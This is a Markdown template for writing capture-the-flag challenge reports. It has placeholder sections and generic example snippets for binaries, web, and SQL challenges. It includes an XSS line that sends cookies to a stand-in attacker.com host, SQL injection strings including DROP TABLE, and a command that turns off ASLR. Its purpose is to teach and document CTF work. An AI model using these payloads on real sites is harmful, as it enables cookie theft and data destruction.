# CTF Writeup Template

Complete CTF writeup template with placeholders for all possible code types, images, and challenge details.

## Challenge Metadata

| Attribute | Value |
|-----------|-------|
| **Challenge Name** | [Challenge Name] |
| **Category** | [e.g., Web, Crypto, Reverse Engineering, Pwn, Misc, Forensics] |
| **Difficulty** | [Easy / Medium / Hard / Expert] |
| **Points** | [Points Value] |
| **CTF Event** | [CTF Name - Year] |
| **Author** | [Challenge Author] |
| **Status** | ✓ Solved |

---

## Challenge Description

[Paste the official challenge description here]

### Challenge Files

- `file.zip` - Download challenge files
- `chall.exe` - Executable file
- `server.py` - Source code
- `flag.txt` - Flag file (if provided)
- `README.md` - Instructions

---

## Challenge Overview

### Summary
Brief overview of what the challenge requires:
- What is being asked
- Key skills needed
- Initial observations

### First Impressions

When I first opened the challenge:
- Downloaded and extracted files
- Identified file types and tools needed
- Made initial observations about the challenge structure

---

## Reconnaissance & Analysis

### File Examination

```bash
# List and identify files
ls -la
file *

# Check for hidden files
ls -la | grep "^\."

# Examine strings in binaries
strings ./chall.exe

# Check file permissions
chmod +x ./chall.exe
```

### Initial Testing

```bash
# Run the challenge
./chall.exe
./chall.exe --help

# Try common inputs
echo "test" | ./chall.exe
./chall.exe "input"

# Network connections (if applicable)
nc localhost 1337
```

### Static Analysis

#### Binary/Executable Analysis

```bash
# Get binary information
file chall.exe
readelf -h chall.exe  # For ELF files
objdump -d chall.exe  # Disassemble

# Check for protections
checksec --file=chall.exe
```

---

## Detailed Solution

### Step 1: Understanding the Mechanism

![Challenge mechanism screenshot - placeholder for image](../../assets/images/writeups/mechanism.png)

**Key findings:**
- Observation 1
- Observation 2
- Observation 3

### Step 2: Vulnerability Identification

**Vulnerability Type**: [Stack Overflow / Buffer Overflow / SQL Injection / Format String / etc.]

The vulnerability exists because:
```
[Explain the root cause]
```

### Step 3: Exploit Development

#### Python Exploit

```python
#!/usr/bin/env python3
# Exploit for [Challenge Name]

import socket
import struct
import sys

def exploit(host, port):
    """Connect to target and send exploit payload"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    # Build payload
    payload = b"A" * 64  # Buffer fill
    payload += struct.pack("<I", 0x08048000)  # Return address
    
    sock.send(payload)
    response = sock.recv(1024)
    print(response.decode())
    sock.close()

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
    exploit(host, port)
```

#### C Exploit

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    // Buffer overflow / ROP gadget chain
    char buffer[64];
    unsigned long *ptr = (unsigned long *)(buffer + 64);
    
    // Overwrite return address
    *ptr = 0x08048000;
    
    // Trigger vulnerability
    strcpy(buffer, "AAAA...");
    
    return 0;
}
```

#### Bash/Command-line

```bash
#!/bin/bash
# Automated exploitation script

# Create payload
python3 -c "print('A'*100 + '\x00\x08\x04\x08')" | ./chall.exe

# For web challenges
curl -X POST http://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"payload":"malicious_input"}'

# For network services
(echo "payload1"; sleep 1; echo "payload2") | nc target 1337
```

#### JavaScript Exploit

```javascript
// Web-based exploitation

fetch('/api/endpoint', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    input: "malicious_payload",
    exp: 0x41414141
  })
})
.then(response => response.json())
.then(data => console.log(data));

// Alternative: XSS payload
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
```

#### SQL Injection Example

```sql
-- Original query
SELECT * FROM users WHERE id = 1;

-- SQL Injection payload
SELECT * FROM users WHERE id = 1' UNION SELECT * FROM flag; --

-- Alternative payloads
' OR '1'='1
1'; DROP TABLE users; --
1' UNION SELECT username, password FROM admin; --
```

---

## Walkthrough

### Complete Solution Steps

1. **Download and extract files**
   ```bash
   unzip challenge.zip
   cd challenge/
   ```

2. **Analyze the binary**
   ```bash
   file chall.exe
   strings chall.exe | grep flag
   ```

3. **Find the vulnerability**
   ```bash
   # Identify the vulnerable function
   objdump -d chall.exe | grep -A20 "vulnerable_function"
   ```

4. **Calculate offset**
   ```bash
   # Using cyclic pattern
   python3 -c "print('A'*100)" | ./chall.exe
   # Note the crash address and calculate offset
   ```

5. **Build and test exploit**
   ```bash
   python3 exploit.py localhost 1337
   ```

6. **Retrieve the flag**
   ```bash
   # Connect to server
   nc target.com 5000
   # Send payload
   # Receive flag
   ```

---

## Flag Extraction

### Method 1: Direct Output
```
$ ./chall.exe "PAYLOAD"
Flag: flag{th1s_1s_th3_fl4g}
```

### Method 2: File Read
```bash
$ cat /tmp/flag.txt
flag{th1s_1s_th3_fl4g}
```

### Method 3: Network
```bash
$ nc target.com 1337
Send your input: [payload sent]
flag{th1s_1s_th3_fl4g}
```

### Method 4: Decoding/Decryption
```python
import base64
from Crypto.Cipher import AES

encrypted = "ciphertext_here"
decrypted = base64.b64decode(encrypted)
# Further decryption steps...
print(decrypted.decode())
```

---

## Visual Aids

### Memory Layout Diagram
```
[Image placeholder: Memory layout showing stack, heap, and buffer overflow]
```

### Attack Flow
```
[Image placeholder: Flowchart of the attack process]
```

---

## Key Concepts

### Concept 1: [Technical Concept]
Explanation of the security concept used:
- How it works
- Why it's vulnerable
- Detection methods

### Concept 2: [Another Technique]
Details about the technique:
- Common use cases
- Variants and bypasses
- Mitigation strategies

---

## Troubleshooting

### Issue 1: Exploit crashes immediately
**Solution**: Check memory layout and ASLR settings
```bash
cat /proc/sys/kernel/randomize_va_space
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### Issue 2: Payload not executing
**Solution**: Verify payload encoding and architecture
```bash
# Check architecture
uname -m
file chall.exe

# Test with simpler payload first
python3 -c "print('test')" | ./chall.exe
```

### Issue 3: Connection timeout
**Solution**: Check if service is running and listening
```bash
ps aux | grep chall
netstat -tulpn | grep 1337
```

---

## Learning Resources

### Related Topics
- [Buffer Overflows 101](https://www.example.com)
- [ROP Chains Explained](https://www.example.com)
- [Heap Exploitation Basics](https://www.example.com)

### Tools Used
- GDB - GNU Debugger
- Ghidra - Binary reverse engineering
- Pwntools - Python library
- Radare2 - Reverse engineering framework

### Write-ups & References
- Similar challenge writeup 1
- Similar challenge writeup 2
- Academic paper on technique

---

## Summary & Takeaways

### What I learned
- Key insight 1
- Key insight 2
- Key insight 3

### Challenge difficulty rating
- Difficulty: [1-10]
- Time spent: [XX hours]
- Key challenge: [What was hardest]

### Flag
```
flag{th1s_1s_th3_fl4g}
```

---

## Appendix

### A. Complete Exploit Script
```python
#!/usr/bin/env python3
"""
Full working exploit for [Challenge Name]
Usage: python3 exploit.py <host> <port>
"""

import socket
import struct
import sys
from pwn import *

def create_payload():
    """Generate complete payload"""
    pass

def exploit():
    """Execute exploitation"""
    pass

if __name__ == "__main__":
    exploit()
```

### B. GDB Debug Session Log
```
(gdb) break vulnerable_function
(gdb) run "AAAA..."
(gdb) info registers
(gdb) x/20x $esp
```

### C. File Checksums
```
MD5 (chall.exe) = 5d41402abc4b2a76b9719d911017c592
SHA256 (chall.exe) = 2c26b46911185131006145dd0c1ae4252717ae5232e8b2350b360fb8e6a265e
```

### D. Additional Notes
- [Note 1]
- [Note 2]
- [Note 3]

---

**Author**: [Your Name]  
**Writeup Date**: [Date]  
**CTF Event**: [Event]  
**Challenge Level**: [Difficulty]

**Disclaimer**: This writeup is for educational purposes. Use the techniques learned responsibly and legally.